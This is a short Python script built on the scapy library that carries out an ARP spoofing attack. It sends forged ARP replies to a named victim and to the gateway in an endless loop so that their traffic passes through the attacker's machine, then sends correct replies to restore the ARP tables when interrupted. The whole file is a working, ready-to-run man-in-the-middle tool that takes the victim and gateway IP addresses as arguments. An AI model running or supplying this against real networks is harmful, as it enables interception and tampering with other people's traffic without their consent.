from scapy.all import ARP,send,getmacbyip
import sys

## ARP packet Fields
    # hwtype : Hardware type (HTYPE)
    # ptype : Protocol type
    # hwlen : Hardware length
    # plen : Protocol length
    # op :  Operation
    # hwsrc :   Sender hardware address
    # psrc :    Sender protocol address 
    # hwdst :   Target hardware address
    # pdst: Target protocol address

def arp_spoof(target_ip,gateway_ip):
    '''Send fake arp reply to the victim'''
    target_mac=getmacbyip(target_ip)
    
    packet=ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=gateway_ip)
    print('[-]Sending ARP reply to {} with MAC {} !!!'.format(packet.pdst,packet.hwsrc))
    send(packet,verbose=False)
    
    return

def arp_restore(target_ip,gateway_ip):
    '''Restore the mac addr of the gateway in victim arp table'''
    gateway_mac=getmacbyip(gateway_ip)
    target_mac=getmacbyip(target_ip)

    packet=ARP(op=2,hwsrc=gateway_mac,psrc=gateway_ip,hwdst=target_mac,pdst=target_ip)
    print('[-]Sending ARP reply to {} with MAC {} !!!'.format(packet.pdst,packet.hwsrc))
    send(packet,verbose=False)
    
    return

def main():
    victim_ip=sys.argv[1]
    gateway_ip=sys.argv[2]
    
    try:
        print('Sending spoofed ARP packets')
        while True:
            arp_spoof(victim_ip,gateway_ip)
            arp_spoof(gateway_ip,victim_ip)
    except KeyboardInterrupt:
        print('Restoring ARP table')
        count=0
        #send 100 packet to restore the arp table
        while count<110:
            arp_restore(victim_ip,gateway_ip)
            arp_restore(gateway_ip,victim_ip)
            count+=1
        print('Quit !!')
        quit()

main()